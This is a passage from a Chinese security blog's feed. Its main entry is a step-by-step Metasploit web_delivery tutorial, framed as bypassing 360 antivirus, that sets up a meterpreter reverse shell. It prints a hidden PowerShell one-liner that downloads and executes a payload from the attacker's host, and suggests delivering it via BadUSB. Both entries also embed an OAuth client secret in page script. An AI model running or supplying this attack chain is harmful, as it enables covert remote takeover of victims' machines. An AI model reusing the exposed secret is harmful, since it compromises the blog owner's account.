    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/mac-for-hackers-install-iterm2-using-terminal.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="绕过360视频演示"><a href="#绕过360视频演示" class="headerlink" title="绕过360视频演示"></a>绕过360视频演示</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/msf_web_delivery.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>&nbsp;<br>&nbsp;</p><h2 id="Metasploit后门模块步骤解说"><a href="#Metasploit后门模块步骤解说" class="headerlink" title="Metasploit后门模块步骤解说"></a>Metasploit后门模块步骤解说</h2><p>&nbsp;<br>&nbsp;<br>1.<span style="color: #000000;">第一步：使用msf的脚本后门模块</span><br>&nbsp;<pre><span style="color: #008000;">use exploit/multi/script/web_delivery</span></pre><br>&nbsp;<br>&nbsp;<br>2.<span style="color: #000000;">.第二步：使用 show opinion 查看需要使用的相关参数</span><br>&nbsp;<pre><span style="color: #008000;"> show options  </span></pre><br>可看到下列参数：需要选择的是target、payload选项(包含ip以及端口)、uripath等<br><img src="http://ojg8j426f.bkt.clouddn.com/0B256837-6545-4F43-B737-D96714986B1E.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>3.<span style="color: #000000;">第三步：查看target 包含多少可选的目标选项，使用以下参数查看</span><br>&nbsp;<pre><span style="color: #008000;">    show targets    </span></pre><br>可看到下列选项包含：Python/PHP/powershell<br><img src="http://ojg8j426f.bkt.clouddn.com/3B57B3A0-18DC-4EB4-89FD-39F4A9613F0A.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>4.<span style="color: #000000;">第四步：设置target 我们这里选择2 —-powershell的这脚本</span><br>&nbsp;<pre><span style="color: #008000;">  set target 2   </span></pre><br>&nbsp;<br>&nbsp;<br>5.<span style="color: #000000;">第五步：设置payload选项，设置windows（powershell）反弹shell链接</span><br>&nbsp;<pre><span style="color: #008000;"> set payload windows/meterpreter/reverse_tcp </span></pre><br>&nbsp;<br>&nbsp;<br>6.<span style="color: #000000;">第六步：设置攻击者-端口默认是：4444，也可以更改 我这里就不设置了，直接用默认的端口</span><br>&nbsp;<pre><span style="color: #008000;">   set LHOST 192.168.1.101  </span></pre><br>&nbsp;<br>&nbsp;<br>7.<span style="color: #000000;">第七步：设置uripath 路径 设置为根目录—– ‘/‘</span><br>&nbsp;<pre><span style="color: #008000;">   set URIPATH   / </span></pre><br>&nbsp;<br>&nbsp;<br>8.<span style="color: #000000;">第八步：执行后门</span><br>&nbsp;<pre><span style="color: #008000;">   exploit   /  </span></pre><br>&nbsp;<br>&nbsp;<br>9.<span style="color: #000000;">第九步：将代码复制目标机器上cmd 下运行——-利用思路可以用到“Badusb”等多种思路</span><br>&nbsp;<pre><span style="color: #008000;">   powershell.exe -nop -w hidden -c $O=new-object net.webclient;$O.proxy=[Net.WebRequest]::GetSystemWebProxy();$O.Proxy.Credentials[Net.CredentialCache]::DefaultCredentials;IEX $O.downloadstring(‘<a href="http://192.168.1.101:8080/‘" target="_blank" rel="external">http://192.168.1.101:8080/‘</a>);    </span></pre><br>&nbsp;<br>&nbsp;<br>10.<span style="color: #000000;">可看到反弹shell<br> </span><br>&nbsp;<pre><span style="color: #008000;">  session -i //查看回话ID 获取回话进入meterpreter 回话  </span></pre><br><img src="http://ojg8j426f.bkt.clouddn.com/FD6713CE-5689-4738-993F-9A9E767F7F10.png" alt="enter description here"><br>&nbsp;<br>&nbsp;</p><h2 id="视频代码演示"><a href="#视频代码演示" class="headerlink" title="视频代码演示"></a>视频代码演示</h2><p><strong><span style="color: #ff0000;font-size: 200%;">重要事情说三遍！！！以下视频暂停或者播放可复制代码</span></strong><br>    代码可复制<br>    代码可复制<br>    代码可复制</p><link rel="stylesheet" type="text/css" href="http://oc78wb8cz.bkt.clouddn.com/asciinema-player.css"><p>  <asciinema-player src="http://oc78wb8cz.bkt.clouddn.com/msf_web_delivery.json" cols="100" rows="30"></asciinema-player><br>  …<br>  <script src="http://oc78wb8cz.bkt.clouddn.com/asciinema-player.js"></script><br>&nbsp;<br>&nbsp;</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/mac-for-hackers-install-iterm2-using-terminal.1280x600.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="http://yoursite.com/categories/Metasploit/"/>
    
    
  </entry>
  
  <entry>
    <title>新增提问板块</title>
    <link href="http://yoursite.com/Discuss1.html"/>
    <id>http://yoursite.com/Discuss1.html</id>
    <published>2015-09-12T12:02:49.000Z</published>
    <updated>2017-09-12T13:09:40.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg" alt="enter description here"><br><a id="more"></a><br>&nbsp;</p><p>这次新开了一个目的也是一个 增加一个留言板块，增进探讨和提问解决 与更多人参与讨论，方便一起解决,有什么问题可以交个我来进行生成md文档 ，上传本次问题，与更多朋友参与一起讨论探讨，方便解决问题！！</p><pre><code>Demon 2017.9.12</code></pre><p>&nbsp;</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=3941024&auto=0&height=66"></iframe><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/%E5%A3%81%E7%BA%B8.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="提问板块" scheme="http://yoursite.com/categories/%E6%8F%90%E9%97%AE%E6%9D%BF%E5%9D%97/"/>
    
    
      <category term="提问板块" scheme="http://yoursite.com/tags/%E6%8F%90%E9%97%AE%E6%9D%BF%E5%9D%97/"/>
    
  </entry>
  
</feed>
